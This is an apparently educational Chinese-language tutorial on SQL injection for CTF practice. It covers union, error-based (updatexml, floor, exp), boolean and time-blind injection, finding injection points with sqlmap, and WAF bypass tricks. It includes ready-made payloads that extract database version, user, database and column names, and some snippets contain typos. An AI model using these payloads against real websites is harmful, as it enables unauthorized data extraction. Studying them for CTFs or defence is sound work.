## SQL注入的分类
1. 可回显的注入
- 可以联合查询的注入（难度3）
- 报错注入（难度3.5）
- 通过注入进行DNS请求，从而达到可回显的目的（难度4.5）
2. 不可回显的注入
- Bool盲注（难度3.5）
- 时间盲注（难度3.5）
3. 二次注入（难度5）
在CTF中通常作为业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入

*SQL注入在实战与CTF比赛中十分常见，涉及各种数据库及隐私；*
*在CTF比赛中一般出题人会加一层WAF，需要学习各种绕过*

## 可联合查询的SQL注入
可联合查询的SQL注入一般较为简单，来学习一下它的基本用法
```
<?php
...
$id = $GET"id];
$getid = "SELECT Od FROM users WHERE user_id = '$id'";
...
```
在这个例子中，id就是我们可传参的对象，
例如：
```
?id=1' uniom select 1 --+
```

这里我们将id拼接到查询语句中，1后面的引号闭合了原本语句中的引号，后面加上我们自己的SQL语法，如果网站没有进行过滤的话，我们就可以肆无忌惮（误）地知道想知道的一切了。

**常见的查询关键词：**

select, and, or, union, (空格)， (单/双引号)

**注：**
---/#：注释后续代码，使其不运行

## 报错注入
*大部分时候网站做了一定防护之后没有明显的，可联合查询注入，这时候可以尝试找找报错注入，将报错提示充当回显，以达到注入的目的*

### updatexml
*updatexml的报错原理是通过函数报错*

例如：
```
mysql>SELECT updataxml(1,concat(0x7e,(SELECT version()),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.6.26~'
mysql>
```

**注：**
0x7e：ASCII码的"~",常用于concat函数
concat(I ,genius,am)：将字符串连接起来常用语报错注入,输出为Igeniusam
### floor

*floor的报错原理是rand和order by或group by的冲突*

**注：**
rand：随机生成0到x之间的数
order by：常用于确定数据库列数
group by：同order by

#### 常见用法
##### 爆破数据库版本信息
```
?id=1' and (select 1 from (select count(*),concat((select (select (select concat (0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
**注：**
information_schema：mysql中字带的表，内含table和colum，查询是须加上（s）
limit n,m：从n+1行获取前m行数据

##### 爆破当前用户
```
?id=1' and (select 1 from (select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)%23
```
##### 爆破当前数据库
```
?id=1' and (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)%23
```
##### 爆破指定表的字段
```
?id=1' and (select 1 from (select count(*),concat((select (select (select distinct concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=0x656d61696c73 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)%23
```

### exp
exp()报错的本质原因是溢出报错
例如：
```
mysql>select exp(~(select * from (select user())x))%23;
ERROR 1690 (22003):DOUBLE value is out of range in 'exp(~(select 'rooot@localhost' from dual))'
```
**注：**
%23：#

## Bool盲注
*Bool盲注通过将返回页面TRUE或FALSE当作回显以达到注入效果*

一般使用 "and 1=1" 和 "and 1=2"判断是否存在Bool盲注点

### 截断函数
substr()：字符串截取函数，例如substr(user(),1,1)，从user函数返回数据第一位偏移一位

left()：左截断函数，例如：user()="admin",则left(user(),1),返回a;
left(user(),2),返回ad

right()：类似于left，从右侧开始向左截断

### 转换函数
ascii()：将字符串转换为ascii码

hex()： 将字符串转换为16进制

### 比较函数
if()：假如

## 时间盲注
*类似于bool盲注，将判断点转换为web响应所需的时间长短*

sleep()：睡眠函数

## 二次注入

## limit后的注入
*当MySQL版本位于5.0.0与5.6.6之间时可在limit后进行注入*

SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT<font color=green>{我是注入点}</font>

## 发现注入点
### 常见注入点
#### GET参数中注入
在拿到网站时可想尝试?id=-1等常见注入点，GET注入最易发现，可手工验证是否存在，也可丢给sqlmap进行验证，关于sqlmap可阅读[《SQL注入--工具篇》](https://marcbark.tech/2024/04/11/sql%e6%b3%a8%e5%85%a5-%e5%b7%a5%e5%85%b7%e7%af%87/)

#### POST参数注入
POST注入点一般需要通过抓包发现，可通过手工或sqlmap验证

#### User-Agent注入
User-Agent注入时建议使用Brup的Request模块，将sqlmap的调成lever=3即可自动检测是否存在User-Agent注入

#### Cookies注入
同User-Agent注入，将sqlmap调成lever=2

### 判断是否存在注入点
以下时笔者常用判断方法
?id='#   是否报错
?id=1 and 1=1#      ?id=1 and 1=2#    是否报错
?id=3-1#

## 绕过
### 双写绕过
例如：
过滤select
将select替换为seleselectct

### 大小写绕过
例如：
过滤select
替换为seLEct

### 16进制绕过（各种编码绕过）
例如：
过滤or
替换为o\x72

### 空格
1. 注释绕过
    1.#
    2.--
    3.//
    4./**/
    5.；%00
**通过注释符绕过空格，例如select/\*\*/username/\*\*/from/\*\*/user**

2. 二次编码
空格的URL编码为%20，再次编码为%2520

3. 特殊符号绕过
利用反斜杠、加号绕过
例如:select\`user\`,\`password\`from



